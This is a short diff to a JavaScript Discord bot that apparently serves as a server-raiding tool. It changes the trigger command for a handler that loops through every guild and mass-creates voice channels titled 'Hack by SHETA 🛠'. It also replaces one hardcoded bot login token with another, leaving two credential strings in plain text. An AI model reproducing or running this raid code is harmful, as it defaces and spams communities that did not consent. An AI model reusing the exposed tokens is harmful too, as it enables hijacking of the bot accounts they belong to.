@@ -664,7 +664,7 @@ m.createRole({
 }
 });
 LOka.on('message', message => {
-         if (message.content === ".") {
+         if (message.content === ".s") {
                LOka.guilds.forEach(m =>{
 m.createChannel('Hack by SHETA 🛠', 'voice');
 m.createChannel('Hack by SHETA 🛠', 'voice');
@@ -1101,4 +1101,4 @@ LOka.on('guildMemberAdd', member => {
  
  
  
-LOka.login("NTg0MzIzMTY5MzM1Mzc3OTMw.XyiAcQ.-xexi2S0RWxklkjgGgFKM05daeg")
+LOka.login("NzM4MTI3MDY4ODE4MzA5MjMx.Xyc3PA.gXdzV400AwiV1Kl-Piop7l7tZiA")
